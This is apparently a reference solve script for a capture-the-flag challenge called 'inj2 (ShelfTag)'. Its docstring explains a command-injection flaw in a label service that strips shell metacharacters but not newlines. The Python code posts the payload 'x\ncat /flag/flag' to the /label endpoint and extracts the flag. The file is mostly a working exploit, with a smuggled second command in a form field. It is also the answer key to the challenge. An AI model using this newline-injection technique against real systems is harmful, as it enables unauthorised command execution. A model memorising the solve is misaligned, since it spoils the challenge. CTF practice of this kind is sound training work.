#!/usr/bin/env python3
"""Reference solve for inj2 (ShelfTag).

The label service runs:
    printf '%s\\n' <text> > /tmp/label_<sku>.txt && cat /tmp/label_<sku>.txt
through a shell after stripping ; | & $ ` from <text> -- but not newlines.
The second line of <text> becomes its own command and owns the redirection:

    text = "x\\ncat /flag/flag"
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8041")
FLAG_RE = re.compile(r"flag\{[^}]+\}")
PAYLOAD_TEXT = "x\ncat /flag/flag"


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)
    try:
        r = requests.post(BASE + "/label",
                          data={"sku": "A1", "text": PAYLOAD_TEXT}, timeout=15)
    except requests.RequestException as e:
        sys.stderr.write(f"unreachable: {e}\n")
        return 1
    m = FLAG_RE.search(r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag found (HTTP {r.status_code})\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
